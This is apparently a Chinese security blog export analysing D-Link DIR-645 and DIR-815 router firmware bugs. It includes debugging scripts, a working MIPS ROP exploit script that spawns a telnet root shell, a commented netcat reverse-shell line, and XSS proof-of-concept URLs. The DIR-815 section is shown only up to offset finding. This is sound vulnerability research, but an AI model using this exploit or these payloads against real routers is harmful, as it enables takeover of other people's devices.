<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>binwalk -Me</code>解压之后，根据漏洞介绍可知，目标文件是<code>authentication. cgi</code>脚本，<code>find . -name 'authentication.cgi'</code>查找文件，并<code>ls -l ./htdocs/web/authentication.cgi</code>发现该cgi文件是指向./htdocs/cgibin的符号链接，真正的目标文件在cgibin中。   </p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200529190127079.png" alt=""></p>
<p>因为溢出的产生原因是HTTP的<strong>POST</strong>参数中<strong>password</strong>值过长，所以调试脚本<code>run.sh</code>如下：post数据可以通过<code>echo 'xxxx' |</code>传入。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash

INPUT="$1"
PORT="23957"
LEN=$(echo -n "$INPUT" | wc -c)
cp $(which qemu-mipsel-static) ./qemu
echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E REQUEST_URI="/authentication.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/authentication.cgi
rm -f ./qemu</code></pre>
<h3 id="定位漏洞函数"><a href="#定位漏洞函数" class="headerlink" title="定位漏洞函数"></a>定位漏洞函数</h3><p>直接通过调试定位漏洞，</p>
<pre class=" language-sh"><code class="language-sh">sudo ./run.sh `python -c "print 'A'*2000"`</code></pre>
<p>因为处理的是<code>authentication.cgi</code>脚本，IDA打开<code>cgibin</code>之后，定位到authenticationcgi_main函数在0x0040B01C，并在该处下断点，单步调试，ra存储在0x76FFF07c处，观察该处的内容何时被覆盖。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530095830139.png" alt=""></p>
<p>继续执行，发现运行完read()函数后，0x76FFF07c处的返回值被覆盖，该处的read()很可能是溢出点。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530100150526.png" alt=""></p>
<p>继续运行到0x0040B514处<code>jal     sub_40A424</code>，进入sub_40A424后执行其中的getenv函数时报错。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530100541572.png" alt=""></p>
<p>查看报错位置代码<code>lbu     $v0, 0($a1)</code>，读取a1寄存器中地址指向的数据，此时a1寄存器中值为0x41414141，无法访问该地址，这个问题应该是在运行过程中覆盖了栈上的内容，然后再赋值给a1寄存器造成的。我们尝试减小POST数据长度。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530100718738.png" alt=""></p>
<p>发现长度为1200时，能够解决该问题。</p>
<pre class=" language-sh"><code class="language-sh">sudo ./run.sh `python -c "print 'A'*1200"`</code></pre>
<p>但是继续运行会出现下面的问题，运行到0x40B588处时，<code>lb      $v0, 0($a2)</code>报错，此时a2中值为3，无法访问该地址。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530102300143.png" alt=""></p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530102318534.png" alt=""></p>
<p>经过调试分析，原因是在0x40B55C处，程序执行两次strstr来分别定位字符串<code>id=</code>和<code>password=</code>。如果post数据中不含这两个定位符则会报上面的错。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530103633469.png" alt=""></p>
<p>结合ghidra反编译结果如下，也能看出执行了两次strstr。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530110540977.png" alt=""></p>
<p>所以post数据中必须含有<code>id=</code>和<code>password=</code>这两个字符串，</p>
<p>sudo ./run.sh <code>python -c "print 'id=password='+'A'*1200"</code></p>
<p>以下是调试strstr函数过程，在第一次strstr时,a1的值为s0指向‘id=’字符串，也就是通过strstr定位我们post数据中的’id=’的位置。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530111944620.png" alt=""></p>
<p>接下来是循环判断’id=’后面的字符串是否存在字符‘&amp;’（0x26)，直到遇到结束符’\0’。这样就得到了‘id=’之后字符串的长度0x4B9=1209=len(1200*‘A’+’password=’)，该长度是0x40B5C4处strncpy的第三个参数，</p>
<p>strncpy(栈上地址0x76FFE718，’id=’之后的内容，0x4B9)。也就是将’id=’之后的内容拷贝进0x76FFE718处。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530160739137.png" alt=""></p>
<p>第二次strstr函数就是定位’password=’字符串的位置，</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530162026794.png" alt=""></p>
<p>接下来循环判断’password=’后面的字符串中是否‘&amp;’(0x26)字符，直到遇到结束符’\0’。这样就得到了‘password=’之后字符串的长度0x4B0=1200=len(1200*’A’)，该长度是0x40B5E4处strncpy的第三个参数，</p>
<p>strncpy(栈上地址0x76FFE798，password=’之后的内容，0x4B0)。也就是将’password=’之后的内容拷贝进0x76FFE798处。这样会覆盖之前第一次strncpy的结果。那么这里的strncpy函数也很可能是漏洞溢出点。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530163523462.png" alt=""></p>
<p>继续运行,能正常运行authenticationcgi_main函数返回值处0x40BCE0处，且ra被覆盖成了’AAAA’。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530163944388.png" alt=""></p>
<p>分析到这里可以确定的事情有，</p>
<ul>
<li>发送的post数据长度不能过长，1200能满足程序正常运行到返回且能覆盖返回地址。</li>
<li>post数据中需要包含’id=’和’password=’这两个字符串。</li>
<li>read()和0x40B5E4处strncpy函数都可能是漏洞触发函数。</li>
</ul>
<p>接下来分析真正的漏洞触发函数，先分析下read(),</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530170446785.png" alt=""></p>
<p>read从stdin（标准输入设备）读取长度为HTTP协议中content_length值的数据，然后写入栈中变量var_430，而该长度只有0x400，并且没有限制content_length值，所以可以造成缓冲区溢出。</p>
<p>read(fileno(stream)，栈上内容var_430大小为0x400，atoi(getenv(‘content_length’)))。</p>
<p>再是0x40B5E4处strncpy函数，</p>
<p>strncpy(栈上地址0x76FFE798，password=’之后的内容，0x4B0)，</p>
<p>函数是从0x76FFF07c开始覆盖，如果覆盖到存放返回值ra的栈地址0x76FFF07c，需要覆盖0x76FFF07c-0x76FFE798=0x8e4=2276字节的缓冲区，而之前2000个’A‘就提前报错了，所以0x40B5E4处strncpy()肯定不是漏洞触发点。这样就确定了read()函数是真正的漏洞触发函数。</p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="劫持PC，确定偏移-1"><a href="#劫持PC，确定偏移-1" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h3><p>利用patternLocOffset.py生成context文件，包含特定格式的2000个字符串。</p>
<p><code>python patternLocOffset.py -c -l 2000 -f context</code></p>
<p>执行命令：</p>
<pre class=" language-sh"><code class="language-sh">sudo ./run.sh `python -c "print 'id=password='+open('context','r').read(1200)"`</code></pre>
<p>使用IDA或者gdb-multiarch联调运行到authenticationcgi_main()返回时ra寄存器中的值为0x42326A42。</p>
<p><code>./patternLocOffset.py -s 0x42326A42 -l 2000</code>确定偏移为1056。</p>
<h3 id="选择攻击路径构造ROP链-1"><a href="#选择攻击路径构造ROP链-1" class="headerlink" title="选择攻击路径构造ROP链"></a>选择攻击路径构造ROP链</h3><p>先找到调用了哪个动态链接库libc.so，然后找到其基地址：</p>
<pre class=" language-sh"><code class="language-sh">gdb-multiarch htdocs/cgibin #一定要加载文件htdocs/cgibin不然vmmap得不到结果
set architecture mips
target remote :23957
b *0040BCE0  #authenticationcgi_main()函数返回jr ra处
c
vmmap</code></pre>
<p>调试发现qemu用户模式使用的libc和DIR815相同都是libuClibc-0.9.30.1.so且基地址都为0x76738000。</p>
<pre class=" language-sh"><code class="language-sh">Breakpoint *0x0040BCE0
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  0x400000   0x401000 rwxp     1000 0      /htdocs/web/authentication.cgi
  0x401000   0x423000 r-xp    22000 1000   /htdocs/web/authentication.cgi
  0x423000   0x433000 ---p    10000 23000  /htdocs/web/authentication.cgi
  0x433000   0x435000 rw-p     2000 23000  /htdocs/web/authentication.cgi
0x76738000 0x76739000 rwxp     1000 0      645/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so
0x76739000 0x76796000 r-xp    5d000 1000   645/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so</code></pre>
<p>而且在authenticationcgi_main()函数返回时也能覆盖fp,s0-s7,ra寄存器，所以接下来构造rop过程跟DIR815也是一样。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531102820083.png" alt=""></p>
<h4 id="通过system函数getshell-1"><a href="#通过system函数getshell-1" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>构造的exp如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> libc_base<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
    gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
    system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
    payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
    payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
    payload <span class="token operator">+=</span> cmd
    <span class="token keyword">return</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">#cmd = "nc -e /bin/sh 192.168.0.122 9999"</span>
    cmd <span class="token operator">=</span> <span class="token string">'telnetd -p 222 -l /bin/sh'</span>
    data <span class="token operator">=</span> <span class="token string">'id=password='</span><span class="token operator">+</span>get_payload<span class="token punctuation">(</span><span class="token number">1056</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x2aaf8000</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
    <span class="token keyword">print</span> str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Content-Type'</span>  <span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    ip_port<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url<span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>ip_port<span class="token operator">+</span><span class="token string">"/authentication.cgi"</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></code></pre>
<p>直接利用Firmadyne仿真环境进行测试，</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531103941133.png" alt=""></p>
<p>测试结果显示能够让目标机执行<code>telnetd -p 222 -l /bin/sh</code>。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531104249650.png" alt=""></p>
<h1 id="Cross-site-scripting-on-“bind-php”"><a href="#Cross-site-scripting-on-“bind-php”" class="headerlink" title="Cross-site scripting on “bind.php”"></a>Cross-site scripting on “bind.php”</h1><p><code>find . -name "bind.php"</code>，文件在<code>/htdocs/parentalcontrols/bind.php</code></p>
<p>获取get表单中deviceid的内容并echo，典型的XSS。</p>
<p>81行    <code>welcome/?device_id=&lt;? echo $_GET["deviceid"];?&gt;';" /&gt;&amp;nbsp;&amp;nbs</code></p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531214731796.png" alt=""></p>
<p>构造’?deviceid=<code>"/&gt;&lt;script&gt;alert('xss')&lt;/script&gt;</code>‘其中“/&gt;是为了闭合前面&lt;“，之后直接加入<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>即可，后面也可以加入’&lt;’匹配之后的’/&gt;’。</p>
<p>poc:</p>
<p><code>http://&lt;target ip&gt;/parentalcontrols/bind.php?deviceid="/&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;</code></p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531211900473.png" alt=""></p>
<h1 id="Cross-site-scripting-on-“info-php”"><a href="#Cross-site-scripting-on-“info-php”" class="headerlink" title="Cross-site scripting on “info.php”"></a>Cross-site scripting on “info.php”</h1><p><code>find . -name "bind.php"</code>，文件在<code>/htdocs/webinc/js/info.php</code></p>
<p>21行 <code>$title    = "ACTION ".$_GET["RESULT"];</code></p>
<p>30行 <code>echo "\t\tBODY.ShowMessage(\"".$title."\", msgArray);\n";</code></p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531214052808.png" alt=""></p>
<p>获取get表单中RESULT的内容给title，之后echo，也是XSS。可以用<code>",msgArray);</code>闭合ShowMessage函数，然后再alert(‘xss’),最后用//注释掉后面代码。</p>
<p>poc：</p>
<p><code>http://&lt;target ip&gt;/info.php?RESULT=",msgArray);alert('xss');//</code></p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531211655181.png" alt=""></p>
<h1 id="Cross-site-scripting-on-“bsc-sms-send-php”"><a href="#Cross-site-scripting-on-“bsc-sms-send-php”" class="headerlink" title="Cross-site scripting on “bsc_sms_send.php”"></a>Cross-site scripting on “bsc_sms_send.php”</h1><p><code>find . -name "bsc_sms_send.php"</code>，文件在<code>/htdocs/webinc/body/bsc_sms_send.php</code></p>
<p>其中的18行XSS漏洞。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531213336975.png" alt=""></p>
<p>poc:</p>
<p><code>http://&lt;target ip&gt;/bsc_sms_send.php?receiver="/&gt;&lt;script&gt;alert('xss');&lt;/script&gt;&lt;div</code></p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531212954993.png" alt=""></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>揭秘家用路由器0day挖掘技术</p>
<p><a href="https://larry.ngrep.me/2018/05/16/dlink-dir-645-post-login-xml-bof/" target="_blank" rel="noopener">D-Link DIR-645 post_login.xml BoF</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>dlink</tag>
        <tag>dir-645</tag>
      </tags>
  </entry>
  <entry>
    <title>DIR815缓冲区溢出漏洞再分析</title>
    <url>/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/</url>
    <content><![CDATA[<p>文章修改后在安全客发表，<a href="https://www.anquanke.com/post/id/206626" target="_blank" rel="noopener">链接</a></p>
<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><blockquote>
<p>Buffer overflow on “hedwig.cgi”<br>Another buffer overflow affects the “hedwig.cgi” CGI script. Unauthenticated remote attackers can invoke this CGI with an overly-long cookie value that can overflow a program buffer and overwrite the saved program address.</p>
</blockquote>
<p>从漏洞公告中可以看出，该漏洞存在于名为<strong>“hedwig.cgi”</strong>的CGI脚本中，未认证攻击者通过调用这个CGI脚本传递一个<strong>超长的Cookie值</strong>，使得程序<strong>栈溢出</strong>，从而获得路由器的远程控制权限。</p>
<h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul>
<li>ubuntu16.04 x64虚拟机：安装了常用的pwn环境，binwalk等工具用于路由器固件调试分析</li>
<li>IDA6.8：静态分析同时安装mipsrop插件寻找rop链，与gdb进行动态调试</li>
<li>Ghidra：反汇编反编译mips架构程序，目前只用于静态分析</li>
<li>qemu2.5：利用qemu的用户和系统模式运行固件</li>
<li>gdbserver：利用大佬已经编译好的<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle" target="_blank" rel="noopener">gdbserver</a>，也可以自己编译生成</li>
<li>Firmadyne：全系统仿真工具，模拟运行路由器固件，本质还是基于qemu的系统模式</li>
<li>D-Link DIR-815 v1.01路由器实体机：用于测试分析结果</li>
<li>固件下载：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP</a></li>
</ul>
<h1 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h1><p><code>binwalk -Me</code>解压 </p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/binwalk.png" alt="">  </p>
<p>该漏洞的核心组件为hedwig.cgi，<code>find . -name '*cgi'</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。   </p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/find-name.png" alt=""></p>
<p>由之前的漏洞介绍可以知道<code>HTTP_COOKIE</code>过长导致漏洞，分别用IDA和ghidra打开cgibin这个文件，在string窗口中进行搜索<code>HTTP_COOKIE</code>。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/http_cookie.png" alt=""></p>
<p>可以找到有一个<code>sess_get_uid</code>函数，这个<a href="https://pup2y.github.io/2020/05/19/d-linkzhong-sobj-lei-han-shu-ni-xiang-fen-xi/">帖子</a>分析了这个函数，就是提取<code>HTTP_COOKIE</code>里面的<code>uid=</code>之后的部分。交叉引用一下，找到了<code>hedwigcgi_main</code>函数。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/sess_get_uidref.png" alt=""></p>
<p>利用Ghidra反汇编<code>hedwigcgi_main</code>函数，可以定位到其中的<code>sprintf</code>函数引起了栈溢出。<code>hedwigcgi_main</code>函数通过<code>sess_get_uid()</code>获取到<code>HTTP_COOKIE</code>中<code>uid=</code>之后的值，并将该内容按照<code>sprintf</code>函数中格式化字符串给定的形式拷贝到栈中，由于没有检测并限制输入的大小，导致栈溢出。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/sprintf1.png" alt=""></p>
<p>但是继续往后看该函数中后面还有一个<code>sprintf</code>函数，第四个参数同样是<code>HTTP_COOKIE</code>中<code>uid=</code>后面的内容，如果可以执行到该<code>sprintf</code>函数则能覆盖之前<code>sprintf</code>函数栈上的内容，同样能够达到缓冲区溢出的目的。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/sprintf2.png" alt=""></p>
<p>在《揭秘家用路由器0day漏洞挖掘技术》一书中写到，如果在文件系统中手工创建<code>/var/tmp</code>文件夹，就能够到达第二个<code>sprintf</code>函数。我对比了下有无<code>/var/tmp</code>文件夹的返回结果:</p>
<p>无<code>/var/tmp</code>，返回unable to open temp file。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/var-tmp.png" alt=""></p>
<p>有<code>/var/tmp</code>，返回no xml data。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/var-tmp2.png" alt=""></p>
<p>想着往里面写个/temp.xml文件并添加内容就可以了吧，结果发现还是返回no xml data。因为fopen打开该文件的方式是’w’，创建一个用于写入的空文件。如果文件名称与已存在的文件相同，则会删除已有文件的内容，文件被视为一个新的空文件。所以只要执行了这条指令文件内容就会被清空，返回值一定是<code>no xml data</code>，所以利用qemu用户模式这样调试的话，是到不了第二个<code>sprintf</code>函数。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/fopen.png" alt=""></p>
<p>所以漏洞点是第一个<code>sprintf</code>函数，挺多帖子也是分析得到第一个<code>sprintf</code>函数是漏洞点。其实是第一个还是第二个对于用户模式下的调试并没有多大关系，就是偏移不一样罢了，构造rop链方法都是一样的。但是对于真实设备而言，就要找到真正的漏洞点在哪。</p>
<h2 id="漏洞重新定位"><a href="#漏洞重新定位" class="headerlink" title="漏洞重新定位"></a>漏洞重新定位</h2><p>爆肝一晚，参考一个大佬的<a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN" target="_blank" rel="noopener">文章</a>，发现了为什么到达不了第二个sprintf的原因。</p>
<p>还需要POST数据包中包含”uid=……”，否则运行不了下面的代码，</p>
<pre class=" language-assembly"><code class="language-assembly">.text:00409AB0                 la      $t9, sobj_strdup
.text:00409AB4                 lw      $a0, 4($s0)
.text:00409AB8                 jalr    $t9 ; sobj_strdup
.text:00409ABC                 nop
.text:00409AC0                 lw      $ra, 0x20+var_4($sp)
.text:00409AC4                 lui     $v1, 0x43  # 'C'
.text:00409AC8                 lw      $gp, 0x20+var_10($sp)
.text:00409ACC                 lw      $s0, 0x20+var_8($sp)
.text:00409AD0                 sw      $v0, haystack
.text:00409AD4                 jr      $ra
.text:00409AD8                 addiu   $sp, 0x20</code></pre>
<p>从而无法申请一个新的堆空间，这样haystack中值将为0，在运行完第一个sprinf之后会进入loc_4096D4，如果haystack为0将则不会进入loc_4096F0分支，进而跳转不了第二个sprintf()。</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096D4 loc_4096D4<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> hedwigcgi_main<span class="token operator">+</span><span class="token number">240</span>j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096D4                 lw      $v0<span class="token punctuation">,</span> haystack
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096DC                 nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">004096E0</span>                 bnez    $v0<span class="token punctuation">,</span> loc_4096F0
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">004096E4</span>                 lui     $v0<span class="token punctuation">,</span> <span class="token number">0x42</span>  # <span class="token string">'B'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">004096E8</span>                 b       loc_409A64
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096EC                 addiu   $a1<span class="token punctuation">,</span> $v0<span class="token punctuation">,</span> <span class="token punctuation">(</span>aNoXmlData_ <span class="token operator">-</span> <span class="token number">0x420000</span><span class="token punctuation">)</span>  # <span class="token string">"no xml data."</span></code></pre>
<p>如何使POST数据包中包含”uid=……”，看了大佬们的文章(参考资料里面)还有《0day》那本书中的测试脚本发现，POST具体数据可以通过类似输入流传入 ：echo “uid=aaa”| /htdocs/web/hedwig.cgi。然后前提也是需要手工创建’/var/tmp’文件夹。</p>
<h1 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>hedwigcgi_main()在调用get_sess_uid函数前需要设置环境变量REQUEST_METHOD为POST。   </p>
<p>cgi程序通过getenv的方式获取HTTP数据包中的数据，整个流程应该为:</p>
<p>主Web程序监听端口-&gt;传送HTTP数据包-&gt;HTTP报文中headers等数据通过环境变量的方式传给cgi处理程序-&gt;cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据</p>
<p>漏洞点sprintf函数</p>
<p>sprintf(栈上的内容,”%s/%s/postxml”,”/runtime/session”,uid的内容)uid的内容是由用户控制的，却没有长度限制，而栈空间有限，hedwigcgi_main同时是一个非叶子函数，那么ra一定存在栈上，我们接下来要做的就是覆盖栈空间内的saved ra达到控制程序流程的目的。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>整个漏洞利用过程是</p>
<ul>
<li>劫持PC，通过调试确定缓冲区大小，定位并确定控制偏移</li>
<li>确定攻击路径，构造ROP链</li>
<li>编写exp,getshell</li>
</ul>
<h3 id="劫持PC，确定偏移"><a href="#劫持PC，确定偏移" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h3><p>利用qemu和IDA进行动态调试,用的是（IDA6.8,qemu2.5）</p>
<p>调试脚本test.sh，其中需要sudo chroot 到文件系统下，然后利用qemu-mipsel-static用户模式进行调试，-E是对应环境变量的参数。-g 指定调试端口，“2&gt; /dev/null” 代表忽略掉错误提示信息。</p>
<pre class=" language-sh"><code class="language-sh">#/bin/bash
test=$(python -c "print 'uid='+open('test','r').read(2000)")
LEN=$(echo -n "$test" | wc -c)
PORT="23957"
cp $(which qemu-mipsel-static) ./qemu
sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2&gt;/dev/null
rm -f ./qemu</code></pre>
<p>在这之前需要利用patternLocOffset.py生成test文件，包含特定格式的2000个字符串。</p>
<p><code>python patternLocOffset.py -c -l 2000 -f test</code></p>
<p>使用IDA调试发现运行到hedwigcgi_main()返回时ra寄存器中的值为0x38694237</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ra.png" alt=""></p>
<p><code>python patternLocOffset.py -s 0x38694237 -l 2000</code>确定缓冲区距离ra的距离为1043。</p>
